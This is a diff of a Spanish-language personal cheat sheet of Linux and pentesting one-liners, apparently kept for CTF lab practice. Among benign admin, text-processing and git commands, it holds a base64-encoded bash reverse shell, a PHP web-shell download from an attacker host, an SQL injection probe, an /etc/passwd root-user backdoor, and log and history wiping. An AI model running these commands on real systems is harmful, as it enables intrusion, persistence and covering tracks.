@@ -1,10 +1,10 @@
 # netcat file transfer
 a> nc -lnvp 444 < chisel
 v> cat > chisel < nc /dev/tcp/ip_atacante/444
---
+
 v> nc -l 4444 > file
 a> nc 10.10.1.23 4444 < file
---
+
 v> cat file | nc 10.6.4.61 9001
 a> nc -lnvp 9001 > file
 
@@ -18,7 +18,7 @@ rlwrap nc -lnvp PUERTO
 ftp -p 10.10.69.8 21 # modo pasivo
 
 # cp
-cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $! 
+cp FILE.iso REN-FILE.iso && watch -n 2 du -sh $!
 
 # cat
 cat file | tr '[A-Z]' '[a-z]' # convierte Mayusculas por Minusculas
@@ -46,25 +46,31 @@ sudo mount -t cifs //10.16.22.245/SCANNERDOC /mnt/ -o user=USER,vers=2.0
 # manipulacion de texto
 pdftotext -layout origen.pdf origen.txt
 pdftotext -eol unix origen.pdf origen.txt
---------------------
 tr '\n' ',' < tplinkList.txt
 paste -sd "," FILE  # agrega una coma entre palabras
-head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' # generador de passwords
---------------------
+
+# generador de passwords
+head /dev/urandom | tr -dc A-Za-z0-9 | head -c 10 ; echo ' ' 
+{ shuf -rn 8 -e {A..Z} {a..z}; shuf -rn 2 -e {0..9}; }| shuf | tr -d $'\n'; echo
+pwgen -1 -c 9 -n 4 -s | while IFS= read -r i; do printf '%s\n' "$i"1; done
+
+# sed
 sed -i '/192\.168\.0\.1/d' /var/log/messages.log # elimina todas las lineas que contienen la ip
 sed 's/ //g' hash.txt # elimina todas las lineas en blanco
 sed '/^[[:space:]]*$/d' # elimina los espacios 
 sed 's/\\n/\n/g' # reemplazar \n a salto de linea
---------------------
+
+# curl
 curl 'http://10.10.154.13/customers/reset?email=robert@acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=test@customer.acmeitsupport.thm' # reset password hijacking
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://{ATTACKER_IP}/shell.php'))?>" -s http://{MACHINE_IP}%
-curl -s -X POST URL --data-urlencode "email=admin@admin.com'-- -"  | grep '<h2>'
-------------------
+curl -s -X POST URL --data-urlencode email=admin@admin.com'-- -  | grep '<h2>'
+
+# awk
 awk '{print "https://"$1}'
 awk '{print $1 ":" $2}'
 awk '{print $1}' FS=':' # FS=delimitador
-awk -F\- '{ print "#EXTINF:0,cap-" $NF " "; print }' one.txt > one-piece-1003.m3u
------------------
+
+#echo
 echo "root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash" >> /etc/passwd # crear un usuario 'root2' con el PASSWORD creado
 echo !:2-3 # rango de argumentos
 echo !? # estado de salida del último comando
@@ -74,14 +80,15 @@ echo !* # todos los argumentos
 echo "testing%3Fcmd%3Dwhoami" | php -R 'echo urldecode($argn);'
 echo /dev/null > ~/.zsh_history #borrar el historial zsh
 echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xNC4xNS4yMDcvODAwMCAwPiYxCg | bash | base64 -d | bash #base64 rev-shell encoding
-----------------
+
+# grep
 grep -oP '\[.*?\]' # quita los corchetes
 grep -a '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]' /var/log/apache2/access.log # formato: HH:MM:SS
 grep -oP '".*?"' bytearray.txt # filtra todo lo que esta entre comillas
 grep '^mo' /usr/share/seclists/Discovery/Web-Content/common.txt | grep -x '.\{7,7\}' # busca palabras de 7 letras
 
 # One-liners
-for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo "post>for i in admin dev test backup; do gobuster -u "url"/$i -w "wordlist" -t -o outputFile$i.txt; done # bucle para enum directorios
+for seq in $(seq 5); do curl -s -i http://10.10.74.120/post?id=$seq | grep 'Post not found' &>/dev/null && echo "post $seq no existe" || echo post>for i in admin dev test backup; do gobuster -u "url"/$i -w WORDLIST -t -o outputFile$i.txt; done # bucle para enum directorios
 for i in {1..20}; do curl http://ip/users/$i 2>&1 | grep "s page</h1>" | cut -f2 -d '>' | cut -f1 -d \' ;done # enum de usuarios
 for i in {1..10}; do timeout 1 bash -c "ping 192.168.0.$i"; done | grep '64' | awk '{print $4}' | tr -d ':' # ping sweep
 for x in port port port; do nmap -Pn --max-retries 0 -p $x ip; done # port knocker
@@ -101,51 +108,49 @@ smbget -R smb://ip/carpeta -U USER
 # arp discovery
 arping -c 1 -I enp5s0 ip/mask
 arp-scan -I enp5s0 IP -l
-
 masscan --arp ip/mask > file
 sudo nmap -RP ip
 
-# varios
 # cups
 ssh admin@10.36.8.43 -T -L 3631:localhost:631 # portforwarding
 cupsctl --remote-admin --remote-any --share-printers # activa la administración remota	
 /usr/sbin/lpadmin -p imp_sistemas_testing -E -v socket://alv2-sist-print:9100 -P OKI_MPS5502mb.ppd
------------------
+
+# google-dorking
 intitle: index.of #open directory listing
------------------
+
 # qemu
 sudo apt install -y spice-vdagent && spice-vdagent # spice qemu copy-paste (aplicar en la VM)
 remote-viewer spice://localhost:5900 -f & disown
 virt-viewer --connect qemu:///system --wait kali64-OS &>/dev/null & disown # levanta el proceso + oculta el output + disocia el proceso de la terminal
-----------------
+
 dpkg -i DEB &>/dev/null # esconde output + error 
-----------------
+
 wget --recursive http://ip -q
 wget -r --no-parent http://10.10.150.153:9000/.mozilla/  # descarga recursiva
-----------------
-apt-get install git htop -qq > /dev/null # muestra solo los errores
----------------
 wget  -q --show-progress --progress=bar:force 2>&1 # muestra solo la barra de progreso
------------------
+
+apt-get install git htop -qq > /dev/null # muestra solo los errores
+
 ping -c ip -R # muestra ruta del ping hasta el destino
----------------
+
 kill -9 $(jobs -p) # elimina los trabajos
 kill % # borra todos los trabajos
---------------
+
 xfreerdp /u:USUARIO /p:PASSWORD /size:1366x768 /f /v:10.16.22.103 # conexion remota via RDP por consola
 xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP
 xfreerdp /v:10.10.239.237 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:/tmp,share
 rdp_check.py USUARIO:PASSWORD@10.21.17.107
----------------
+
 read -n 5 -s -p "No podes poner mas de 5 caracteres" # n=caracteres, s=silent(oculta el texto), p=prompt
 read -t 10 # 10 segundos para ingresar texto
---------------
+
 setxkbmap -layout es # cambiar distribución de teclado
 dpkg-reconfigure locales # cambiar idioma del sistema
----------------
+
 # caracteres especiales que necesitan ser escapados con \
 # ! " # $ & ' ( ) * , : ; < = > ? @ [ \ ] ^ ` { | }
-----------------
+
 # agregar multiples lineas a archivo
 cat <<EOF >> /tmp/file.txt
 linea 1
@@ -157,7 +162,14 @@ sudo tee -a /tmp/file.txt > /dev/null <<EOT
 linea 1
 linea 2
 EOT
---------------
+
+# multiline comment
+:<<'END_COMMENT'
+comment1
+comment2 
+comment3
+END_COMMENT
+
 # git
 # git initial config
 git config --global user.name "John Doe"
@@ -176,7 +188,7 @@ git commit -m "first commit"
 git branch -M main
 git remote add origin https://github.com/PUTINVLADIMI/Dashboard-homer.git
 git push -u origin main
----------------
+
 # fix snd-hda-intel en ubuntu 20.04
 sudo tee /etc/modprobe.d/snd-hda-intel-fix.conf <<< 'options snd-hda-intel probe_mask=1'
 
@@ -218,3 +230,6 @@ dig SOA wizardzines.com
 
 # virtualbox fix multipass
 systemctl stop snap.multipass.multipassd.service
+
+# disco 1TB automount
+UUID=26C00F163A80CC80 /home/USUARIO/datos ntfs auto,uid=1000,gid=1000,dmask=027,fmask=137      0  	  0
